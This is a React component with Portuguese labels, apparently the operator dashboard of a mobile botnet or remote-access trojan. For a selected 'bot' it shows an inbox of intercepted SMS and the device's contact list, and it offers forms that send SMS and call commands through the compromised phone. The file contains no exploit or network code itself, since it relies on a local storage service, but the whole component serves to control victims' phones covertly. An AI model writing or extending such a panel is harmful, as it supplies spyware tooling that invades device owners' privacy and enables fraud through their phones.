import React, { useState } from 'react';
import type { Bot } from '../types';
import { StorageService } from '../services/storage';

interface SMSManagerProps {
  bot: Bot;
}

export const SMSManager: React.FC<SMSManagerProps> = ({ bot }) => {
  const [phoneInput, setPhoneInput] = useState('');
  const [smsMessage, setSmsMessage] = useState('');
  const [dialNumber, setDialNumber] = useState('');
  
  const smsList = StorageService.getSms(bot.id);
  const contacts = StorageService.getContacts();

  const handleSendSms = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneInput || !smsMessage) return;

    StorageService.sendSmsCommand(bot.id, phoneInput, smsMessage);
    setSmsMessage('');
    alert(`Comando de SMS enviado para: ${phoneInput}`);
  };

  const handleDialerClick = (num: string) => {
    setDialNumber(prev => prev + num);
  };

  const handleTriggerCall = () => {
    if (!dialNumber) return;
    StorageService.addLog('warning', `Comando de ligação efetuada enviado para número: ${dialNumber}`, bot.id, bot.name);
    alert(`Comando de ligação efetuado para: ${dialNumber}`);
    setDialNumber('');
  };

  return (
    <div style={{ display: 'grid', gridTemplateColumns: '1fr 340px', gap: '20px', padding: '16px' }}>
      
      {/* Left Column: SMS Log and Contacts */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        
        {/* Intercepted SMS Feed */}
        <div className="glass-panel" style={{ padding: '20px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '12px', borderBottom: '1px solid var(--border-color)', paddingBottom: '6px' }}>
            Caixa de SMS Interceptada
          </h4>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px', maxHeight: '280px', overflowY: 'auto' }}>
            {smsList.length === 0 ? (
              <p style={{ color: 'var(--text-muted)', textAlign: 'center', padding: '20px' }}>Nenhum SMS interceptado ainda.</p>
            ) : (
              smsList.map(sms => (
                <div 
                  key={sms.id}
                  style={{
                    padding: '10px 14px',
                    borderRadius: '8px',
                    background: sms.type === 'received' ? 'rgba(6, 182, 212, 0.05)' : 'rgba(139, 92, 246, 0.05)',
                    border: sms.type === 'received' ? '1px solid rgba(6, 182, 212, 0.1)' : '1px solid rgba(139, 92, 246, 0.1)',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '4px'
                  }}
                >
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '11px', color: 'var(--text-secondary)' }}>
                    <span>{sms.type === 'received' ? '📥 Recebido de' : '📤 Enviado para'}: <strong>{sms.phone}</strong></span>
                    <span>{sms.timestamp}</span>
                  </div>
                  <div style={{ fontSize: '13px', color: 'var(--text-primary)' }}>{sms.message}</div>
                </div>
              ))
            )}
          </div>
        </div>

        {/* Contacts list */}
        <div className="glass-panel" style={{ padding: '20px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '12px', borderBottom: '1px solid var(--border-color)', paddingBottom: '6px' }}>
            Lista de Contatos
          </h4>
          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px', maxHeight: '240px', overflowY: 'auto' }}>
            {contacts.map((contact, i) => (
              <div 
                key={i}
                style={{ 
                  display: 'flex', 
                  justifyContent: 'space-between', 
                  alignItems: 'center', 
                  padding: '8px 12px', 
                  background: 'var(--bg-secondary)', 
                  border: '1px solid var(--border-color)',
                  borderRadius: '6px' 
                }}
              >
                <div>
                  <div style={{ fontWeight: '500', fontSize: '13px' }}>{contact.name}</div>
                  <div style={{ fontSize: '11px', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>{contact.phone}</div>
                </div>
                <div style={{ display: 'flex', gap: '4px' }}>
                  <button 
                    className="btn btn-secondary" 
                    onClick={() => { setPhoneInput(contact.phone); }}
                    style={{ padding: '2px 8px', fontSize: '11px' }}
                  >
                    💬 SMS
                  </button>
                  <button 
                    className="btn btn-secondary" 
                    onClick={() => { setDialNumber(contact.phone); }}
                    style={{ padding: '2px 8px', fontSize: '11px' }}
                  >
                    📞 Discar
                  </button>
                </div>
              </div>
            ))}
          </div>
        </div>

      </div>

      {/* Right Column: Send SMS and Call Dialer */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
        
        {/* Send SMS Box */}
        <div className="glass-panel" style={{ padding: '20px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600', marginBottom: '12px' }}>Enviar Mensagem SMS</h4>
          <form onSubmit={handleSendSms} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
            <input 
              type="text" 
              placeholder="Número do telefone (+55...)" 
              value={phoneInput}
              onChange={(e) => setPhoneInput(e.target.value)}
              style={{ fontSize: '13px' }}
              required
            />
            <textarea 
              placeholder="Digite o texto da mensagem..." 
              value={smsMessage}
              onChange={(e) => setSmsMessage(e.target.value)}
              style={{ fontSize: '13px', minHeight: '80px', resize: 'none' }}
              required
            />
            <button type="submit" className="btn btn-primary" style={{ padding: '8px' }}>
              Enviar Comando SMS
            </button>
          </form>
        </div>

        {/* Dialer Panel (Keypad) */}
        <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
          <h4 style={{ fontSize: '16px', fontWeight: '600' }}>Teclado de Chamada</h4>
          
          <div style={{ 
            background: 'var(--bg-primary)', 
            border: '1px solid var(--border-color)', 
            borderRadius: '6px', 
            padding: '12px', 
            textAlign: 'center', 
            fontFamily: 'var(--font-mono)', 
            fontSize: '18px', 
            color: 'var(--accent-cyan)',
            minHeight: '48px',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>
            {dialNumber || 'Digite o número'}
          </div>

          {/* Grid Layout of the Keyboard */}
          <div style={{ 
            display: 'grid', 
            gridTemplateColumns: 'repeat(3, 1fr)', 
            gap: '8px',
            justifyItems: 'center'
          }}>
            {['1', '2', '3', '4', '5', '6', '7', '8', '9', '*', '0', '#'].map(num => (
              <button
                key={num}
                onClick={() => handleDialerClick(num)}
                style={{
                  width: '50px',
                  height: '50px',
                  borderRadius: '50%',
                  background: 'var(--bg-tertiary)',
                  border: '1px solid var(--border-color)',
                  color: 'white',
                  fontSize: '18px',
                  fontWeight: '600',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  cursor: 'pointer'
                }}
                onMouseEnter={(e) => e.currentTarget.style.background = 'var(--accent-purple)'}
                onMouseLeave={(e) => e.currentTarget.style.background = 'var(--bg-tertiary)'}
              >
                {num}
              </button>
            ))}
          </div>

          <div style={{ display: 'flex', gap: '8px', marginTop: '8px' }}>
            <button 
              className="btn btn-danger" 
              onClick={() => setDialNumber('')}
              style={{ flex: 1, padding: '8px' }}
            >
              Limpar
            </button>
            <button 
              className="btn btn-primary" 
              onClick={handleTriggerCall}
              style={{ flex: 2, padding: '8px', background: 'var(--success)', boxShadow: '0 4px 10px rgba(16, 185, 129, 0.3)' }}
            >
              📞 Efetuar Ligação
            </button>
          </div>
        </div>

      </div>

    </div>
  );
};
